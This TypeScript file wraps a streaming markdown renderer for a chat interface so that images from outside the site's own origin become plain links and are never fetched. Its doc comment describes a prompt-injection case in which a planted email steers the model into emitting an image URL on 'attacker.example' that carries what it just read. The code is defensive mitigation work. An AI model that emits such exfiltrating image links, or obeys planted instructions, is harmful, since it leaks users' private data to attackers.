import * as smd from 'streaming-markdown';

import { isOwnOriginImage } from '@/components/Markdown';

/**
 * An http(s) URL to link a refused image to, or null for anything else — a
 * `javascript:` source must not become a clickable anchor on the way to being
 * made safe.
 */
function linkableUrl(value: string): string | null {
  try {
    const url = new URL(value, window.location.origin);

    return url.protocol === 'http:' || url.protocol === 'https:' ? url.href : null;
  } catch {
    return null;
  }
}

/**
 * `streaming-markdown`'s DOM renderer, holding images to {@link isOwnOriginImage}.
 *
 * The live reply is not rendered by `Markdown`: while a turn streams, `Chat`
 * writes every TEXT and THINK frame straight into the DOM through this
 * renderer, and only a reloaded message goes through `Markdown` and its
 * `MarkdownImage`. The stock renderer opens an `<img>` at `![` and sets `src`
 * to whatever the model wrote the moment the `)` arrives — so a model steered
 * by a planted email into ending its reply with
 * `![](https://attacker.example/log?d=<what it just read>)` had the reader's
 * browser send that query string off as the reply painted, whatever the stored
 * copy rendered as later. The gateway CSP allows `img-src *`, so nothing
 * downstream stops it.
 *
 * `set_attr` is the only place a URL reaches the element, and the `<img>` has
 * no `src` — so fetches nothing — until then. That is the one hook wrapped:
 * an own-origin source is set as before, and anything else replaces the
 * still-empty `<img>` with the link `MarkdownImage` renders (the alt text, or
 * the URL, opening in a new tab with no referrer). Nothing is fetched.
 */
export function streamingMarkdownRenderer(root: HTMLElement): smd.Default_Renderer {
  const renderer = smd.default_renderer(root);

  return {
    ...renderer,
    set_attr(data, type, value) {
      if (type !== smd.Attr.Src) {
        smd.default_set_attr(data, type, value);

        return;
      }

      const image = data.nodes[data.index];
      // The stock renderer appends the alt text to the open token, which for
      // an image is the <img> itself — where nothing ever displays it.
      const alt = image.textContent ?? '';

      if (isOwnOriginImage(value)) {
        image.textContent = '';
        image.setAttribute('alt', alt);
        image.setAttribute('src', value);

        return;
      }

      const link = document.createElement('a');
      const href = linkableUrl(value);

      if (href) {
        link.href = href;
      }

      link.rel = 'noopener noreferrer';
      link.target = '_blank';
      link.dataset.remoteImage = '';
      link.textContent = alt || value;

      image.replaceWith(link);
      data.nodes[data.index] = link;
    },
  };
}
